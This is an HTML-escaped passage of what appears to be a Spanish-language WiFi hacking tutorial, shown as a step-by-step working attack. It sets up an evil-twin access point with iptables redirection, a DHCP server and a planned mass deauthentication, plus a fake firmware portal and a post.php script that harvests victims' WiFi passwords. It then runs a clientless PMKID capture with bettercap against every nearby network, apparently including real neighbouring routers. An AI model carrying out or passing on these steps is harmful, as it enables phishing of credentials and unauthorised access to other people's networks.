&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Os recuerdo que el tercer comando aplicado es necesario para este caso, igual que cuando hacíamos
envenenamiento ARP, pues para este caso necesitamos contar con el enrutamiento habilitado en nuestro equipo.&lt;/p&gt;

&lt;h4 id=&quot;control-y-creación-de-reglas-de-enrutamiento-por-iptables&quot;&gt;Control y creación de reglas de enrutamiento por iptables&lt;/h4&gt;

&lt;p&gt;A continuación, limpiamos cualquier tipo de regla que tengamos previamente definida de &lt;strong&gt;iptables&lt;/strong&gt; y generamos nuestras nuevas reglas:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#iptables --flush&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#iptables --table nat --flush&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#iptables --delete-chain&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#iptables --table nat --delete-chain&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#iptables --append FORWARD --in-interface at0 -j ACCEPT&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#iptables -t nat -A POSTROUTING -j MASQUERADE&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La idea es nutrir nuestra interfaz &lt;strong&gt;at0&lt;/strong&gt; de la conexión padre &lt;strong&gt;eth0&lt;/strong&gt;, de esta forma, los usuarios que se
conecten a nuestro AP podrán navegar por internet sin mayor inconveniente (en otras palabras, crear un túnel
de conexión).&lt;/p&gt;

&lt;p&gt;Asimismo, cualquier tráfico &lt;strong&gt;HTTP&lt;/strong&gt; que detectemos por parte de nuestras víctimas, será redireccionado a
nuestra página web fraudulenta, con el objetivo de hacerles creer que realmente el router necesita de una
configuración de Firmware y por ello solicita las credenciales de acceso a la red.&lt;/p&gt;

&lt;h4 id=&quot;sincronización-de-reglas-definidas-con-el-fake-ap&quot;&gt;Sincronización de reglas definidas con el Fake AP&lt;/h4&gt;

&lt;p&gt;Ya por último, lo que nos queda es sincronizar todas nuestras reglas definidas con el Fake AP, para que cobre
vida y comience a operar bajo nuestras reglas:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0&lt;/span&gt;
Internet Systems Consortium DHCP Server 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/
Config file: /etc/dhcpd.conf
Database file: /var/lib/dhcp/dhcpd.leases
PID file: /var/run/dhcpd.pid
Wrote 2 leases to leases file.
Listening on LPF/at0/e4:70:b8:d3:93:5c/192.168.1.128/25
Sending on   LPF/at0/e4:70:b8:d3:93:5c/192.168.1.128/25
Sending on   Socket/fallback/fallback-net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si obtenemos un output como el anterior, es que todo se ha realizado correctamente. Una vez llegados a este
punto, lo que procedemos desde otra consola es a aplicar un ataque de deautenticación global
(FF:FF:FF:FF:FF:FF) contra toda la red.&lt;/p&gt;

&lt;p&gt;Tras los clientes lanzar paquetes &lt;strong&gt;Probe Request&lt;/strong&gt; en busca del AP, como el legítimo queda anulado debido a
los paquetes que estamos de manera continua enviando, los dispositivos se confundirán y harán que estos se
conecten a nuestro Fake AP, ¿por qué sin autenticarse?, porque nuestro Fake AP es de protocolo &lt;strong&gt;OPN&lt;/strong&gt; :)&lt;/p&gt;

&lt;p&gt;Esto del lado de la víctima es casi inperceptible, pues la migración de una red a otra para algunos
dispositivos es casi inmediata. Ya dependiendo de la imaginación, originalidad e ingenio de cada uno, se podrá
obtener lo deseado una vez la víctima se mueve por nuestros terrenos.&lt;/p&gt;

&lt;h4 id=&quot;robo-de-datos&quot;&gt;Robo de datos&lt;/h4&gt;

&lt;p&gt;Como es de esperar, una vez la víctima navegue por una página HTTP, será redireccionada a nuestro portal web
falso. A nivel de dirección URL, figurará el dominio al cual ha accedido, es decir, no figurará nuestra
dirección IP.&lt;/p&gt;

&lt;p&gt;Una vez esta introduce sus credenciales, estas serán enviadas a nuestra base de datos y a través del servicio
&lt;strong&gt;MYSQL&lt;/strong&gt; de forma interactiva las podremos visualizar sin mayor problema.&lt;/p&gt;

&lt;p&gt;Otra forma más cómoda en caso de no haber querido tirar de &lt;strong&gt;MYSQL&lt;/strong&gt;, podría haber sido para el &lt;strong&gt;ACTION&lt;/strong&gt; del
HTML principal, haber definido un nuevo archivo &lt;strong&gt;post.php&lt;/strong&gt; con una estructura semejante como esta:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wifi-password.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;print_r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;FILE_APPEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;refresh&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0; url=http://192.168.1.1&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;De manera que tras introducir las credenciales de acceso, estas son depositadas en nuestro equipo en la ruta
&lt;strong&gt;/var/www/html&lt;/strong&gt;, en el fichero &lt;strong&gt;wifi-password.txt&lt;/strong&gt;. De igual manera, en caso de introducir múltiples
contraseñas por parte de varios clientes, estas se van apilando, pudiendo ver todo el histórico de contraseñas
introducidas.&lt;/p&gt;

&lt;h3 id=&quot;ataque-a-redes-sin-clientes&quot;&gt;Ataque a redes sin clientes&lt;/h3&gt;

&lt;p&gt;Hasta ahora, hemos visto todas las técnicas necesarias para averiguar la contraseña de una red Wifi que
funcione por protocolo WPA/WPA2 y autenticación PSK, pero siempre con la condición de que esta debe de poseer clientes.&lt;/p&gt;

&lt;p&gt;¿Qué pasa si la red no cuenta con clientes?, ¿se puede averiguar la contraseña?, la respuesta es sí, y no…
no es con un ataque de falsa autenticación.&lt;/p&gt;

&lt;h4 id=&quot;clientless-pkmid-attack&quot;&gt;Clientless PKMID Attack&lt;/h4&gt;

&lt;p&gt;Esta nueva metodología nos permitirá romper la seguridad de WPA y WPA2 mediante el denominado Pairwise Master
Key Identifier o PMKID, una característica roaming habilitada en muchos dispositivos.&lt;/p&gt;

&lt;p&gt;La principal diferencia con ataques existentes es que en este ataque, la captura de un EAPOL o saludo de
4-vías no es necesaria, como en casos anteriores. El nuevo ataque es realizado con el RSN IE (Robust Network
Information Element) de una simple trama EAPOL, lo cual es flipante y maravilloso.&lt;/p&gt;

&lt;h5 id=&quot;ataque-desde-bettercap&quot;&gt;Ataque desde Bettercap&lt;/h5&gt;

&lt;p&gt;Aunque no lo hago así, os lo explico también. Imaginemos que queremos capturar los Hashes de múltiples redes
inalámbricas de nuestro entorno. Olvidémonos ya de los Handshakes, y de ataques de de-autenticación y todas
estas técnicas que habíamos visto previamente.&lt;/p&gt;

&lt;p&gt;Lo primero como siempre es ponerse en modo monitor, y desde &lt;strong&gt;Bettercap&lt;/strong&gt; efectuar el siguiente procedimiento:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/opt/bettercap]
└──╼ &lt;span class=&quot;c&quot;&gt;#./bettercap -iface wlan0mon&lt;/span&gt;
bettercap v2.24.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;built &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;linux amd64 with go1.10.4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a list of commands]

 wlan0mon  » wifi.recon on
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:15] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi using interface wlan0mon &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e4:70:b8:d3:93:5c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi started &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;min rssi: &lt;span class=&quot;nt&quot;&gt;-200&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi channel hopper started.
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point MOVISTAR_2A51 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-94&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 78:29:ed:a9:2a:52 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Askey Computer Corp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point MOVISTAR_A908 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-83&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as &lt;span class=&quot;nb&quot;&gt;fc&lt;/span&gt;:b4:e6:99:a9:09 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Askey Computer Corp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-55&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 1c:b0:44:d4:16:78 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Askey Computer Corp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point MIWIFI_psGP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-95&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 50:78:b3:ee:bb:ac.
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.client.new] new station 20:34:fb:b1:c5:53 detected &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » w[22:38:20] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point Wlan1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-81&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as f8:8e:85:df:3e:13 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Comtrend Corporation&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » wifi.[22:38:21] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point devolo-30d32d583c6b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-81&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 30:d3:2d:58:3c:6b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;devolo AG&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » wifi.[22:38:21] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point LowiF7D3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-90&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 10:62:d0:f6:f7:d8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Technicolor CH USA Inc.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » wifi.show[22:38:21] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point vodafone4038 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-91&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as 28:9e:fc:0c:40:3e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Sagemcom Broadband SAS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » wifi.show[22:38:21] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.ap.new] wifi access point MOVISTAR_3126 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-94&lt;/span&gt; dBm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; detected as cc:d4:a1:0c:31:28 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;MitraStar Technology Corp.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 wlan0mon  » wifi.show

┌─────────┬───────────────────┬─────────────────────┬──────────────────┬──────────────────────┬────┬─────────┬───────┬───────┬──────────┐
│ RSSI ▴  │       BSSID       │        SSID         │    Encryption    │         WPS          │ Ch │ Clients │ Sent  │ Recvd │   Seen   │
├─────────┼───────────────────┼─────────────────────┼──────────────────┼──────────────────────┼────┼─────────┼───────┼───────┼──────────┤
│ &lt;span class=&quot;nt&quot;&gt;-57&lt;/span&gt; dBm │ 1c:b0:44:d4:16:78 │ MOVISTAR_1677       │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 6  │ 1       │ 486 B │ 172 B │ 22:38:19 │
│ &lt;span class=&quot;nt&quot;&gt;-83&lt;/span&gt; dBm │ f8:8e:85:df:3e:13 │ Wlan1               │ WPA &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TKIP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  │ 1.0                  │ 9  │         │       │       │ 22:38:20 │
│ &lt;span class=&quot;nt&quot;&gt;-84&lt;/span&gt; dBm │ &lt;span class=&quot;nb&quot;&gt;fc&lt;/span&gt;:b4:e6:99:a9:09 │ MOVISTAR_A908       │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 1  │         │       │       │ 22:38:17 │
│ &lt;span class=&quot;nt&quot;&gt;-85&lt;/span&gt; dBm │ 30:d3:2d:58:3c:6b │ devolo-30d32d583c6b │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 11 │         │       │       │ 22:38:22 │
│ &lt;span class=&quot;nt&quot;&gt;-86&lt;/span&gt; dBm │ 10:62:d0:f6:f7:d8 │ LowiF7D3            │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TKIP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 11 │         │       │       │ 22:38:22 │
│ &lt;span class=&quot;nt&quot;&gt;-92&lt;/span&gt; dBm │ 28:9e:fc:0c:40:3e │ vodafone4038        │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TKIP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 11 │         │       │       │ 22:38:21 │
│ &lt;span class=&quot;nt&quot;&gt;-94&lt;/span&gt; dBm │ 50:78:b3:ee:bb:ac │ MIWIFI_psGP         │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 6  │         │       │       │ 22:38:19 │
│ &lt;span class=&quot;nt&quot;&gt;-94&lt;/span&gt; dBm │ 78:29:ed:a9:2a:52 │ MOVISTAR_2A51       │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0                  │ 1  │         │       │       │ 22:38:16 │
│ &lt;span class=&quot;nt&quot;&gt;-94&lt;/span&gt; dBm │ cc:d4:a1:0c:31:28 │ MOVISTAR_3126       │ WPA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CCMP, PSK&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not configured&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; │ 11 │         │       │       │ 22:38:21 │
└─────────┴───────────────────┴─────────────────────┴──────────────────┴──────────────────────┴────┴─────────┴───────┴───────┴──────────┘

wlan0mon &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ch. 13&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; / ↑ 0 B / ↓ 26 kB / 112 pkts

 wlan0mon  »  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya viendo que se nos listan todas las redes, corremos el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; wlan0mon  » wifi.assoc all
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi sending association request to AP MOVISTAR_2A51 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;channel:1 encryption:WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi sending association request to AP MOVISTAR_A908 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;channel:1 encryption:WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi sending association request to AP MOVISTAR_2F95 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;channel:1 encryption:WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi sending association request to AP MIWIFI_psGP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;channel:6 encryption:WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi sending association request to AP MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;channel:6 encryption:WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi sending association request to AP Wlan1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;channel:9 encryption:WPA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi sending association request to AP vodafone4038 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;channel:11 encryption:WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi sending association request to AP MOVISTAR_3126 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;channel:11 encryption:WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi sending association request to AP LowiF7D3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;channel:11 encryption:WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi sending association request to AP devolo-30d32d583c6b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;channel:11 encryption:WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi sending association request to AP MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;channel:112 encryption:WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sys.log] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;inf] wifi sending association request to AP MOVISTAR_PLUS_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;channel:112 encryption:WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:23] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.client.handshake] captured e4:70:b8:d3:93:5c -&amp;gt; MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:23] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.client.handshake] captured e4:70:b8:d3:93:5c -&amp;gt; MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:23] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.client.handshake] captured e4:70:b8:d3:93:5c -&amp;gt; MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:23] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.client.handshake] captured e4:70:b8:d3:93:5c -&amp;gt; MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:24] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.client.handshake] captured e4:70:b8:d3:93:5c -&amp;gt; MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  » &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:39:24] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wifi.client.handshake] captured e4:70:b8:d3:93:5c -&amp;gt; MOVISTAR_1677 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; RSN PMKID to /root/bettercap-wifi-handshakes.pcap
